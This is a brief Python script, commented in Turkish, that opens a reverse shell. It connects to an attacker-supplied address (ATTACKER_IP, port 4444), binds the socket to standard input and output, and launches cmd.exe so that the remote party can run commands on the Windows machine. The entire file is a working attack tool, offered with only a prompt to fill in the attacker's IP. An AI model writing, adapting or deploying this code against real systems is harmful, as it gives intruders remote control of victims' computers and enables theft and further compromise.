import socket,subprocess,os

# SENİN IP ADRESİNİ YAZ
ATTACKER_IP = "192.168.1.X"
PORT = 4444

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ATTACKER_IP,PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["cmd.exe"])